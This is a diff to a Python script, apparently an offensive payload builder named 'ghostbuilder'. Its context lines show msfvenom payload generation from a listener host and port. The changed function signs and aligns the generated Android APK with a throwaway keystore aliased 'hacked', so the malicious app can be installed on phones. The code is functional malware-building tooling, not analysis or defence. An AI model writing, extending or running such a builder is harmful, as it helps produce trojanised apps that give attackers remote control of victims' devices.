@@ -204,26 +204,58 @@ def generate(key: str, lhost: str, lport: int, out: str, infile: str | None = No
     fail('msfvenom failed or output missing')
     return False
 
-
 def android_sign(apk: str, final: str) -> bool:
-    keystore = 'ghostbuilder.keystore'
-    gen = ['keytool', '-genkey', '-v', '-keystore', keystore, '-alias', 'hacked', '-keyalg', 'RSA', '-keysize', '2048', '-validity', '10000']
+    keystore = "ghostbuilder.keystore"
+
+    gen = [
+        'keytool', '-genkeypair',
+        '-v',
+        '-keystore', keystore,
+        '-alias', 'hacked',
+        '-keyalg', 'RSA',
+        '-keysize', '2048',
+        '-validity', '10000'
+    ]
+
+
     rc = run_cmd(gen)
     if rc != 0:
         fail('keytool failed')
         return False
-    sign = ['jarsigner', '-verbose', '-sigalg', 'SHA1withRSA', '-digestalg', 'SHA1', '-keystore', keystore, apk, 'hacked']
-    rc = run_cmd(sign)
-    if rc != 0:
-        fail('jarsigner failed')
-        return False
-    verify = ['jarsigner', '-verify', '-verbose', '-certs', apk]
-    run_cmd(verify)
-    align = ['zipalign', '-v', '4', apk, final]
+
+    aligned = apk + '.aligned.apk'
+
+    align = [ 'zipalign', '-f', '-v', '4', apk, aligned ]
+
     rc = run_cmd(align)
     if rc != 0:
         fail('zipalign failed')
         return False
+
+    sign = [
+        'apksigner',
+        'sign',
+        '--ks', keystore,
+        '--ks-key-alias', 'hacked',
+        '--out', final,
+        aligned,
+    ]
+
+    rc = run_cmd(sign)
+    if rc != 0:
+        fail('apksigner failed')
+        return False
+
+    verify = [ 'apksigner', 'verify', '--verbose', final ]
+
+    rc = run_cmd(verify)
+    if rc != 0:
+        fail('APK signature verification failed')
+        return False
+
+    run_cmd(['rm', '-f', aligned])
     run_cmd(['rm', '-f', keystore])
+
     ok(f'signed: {final}')
     return True
+
